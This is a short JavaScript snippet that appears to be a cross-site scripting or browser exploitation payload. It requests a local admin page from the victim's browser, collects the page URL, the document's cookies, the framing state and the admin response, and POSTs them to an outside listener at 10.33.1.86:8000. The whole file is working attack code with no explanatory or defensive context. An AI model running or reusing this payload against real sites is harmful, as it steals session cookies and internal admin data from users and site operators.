const notify = ({ payload, error }) => {
  fetch("http://10.33.1.86:8000/index.php?callback=true", {
    method: "POST",
    body: JSON.stringify({ payload, error, tick: new Date() }),
  });
};

const adminPage = () =>
  fetch("http://localhost/admin").then((res) => res.json());

adminPage()
  .then((response) => {
    try {
      let payload = {
        location: window.location.href,
        cookie: document.cookie,
        top: top !== self,
        adminPage: response,
      };
      notify({ payload });
    } catch (error) {
      notify({ error });
    }
  })
  .catch((error) => notify({ error }));
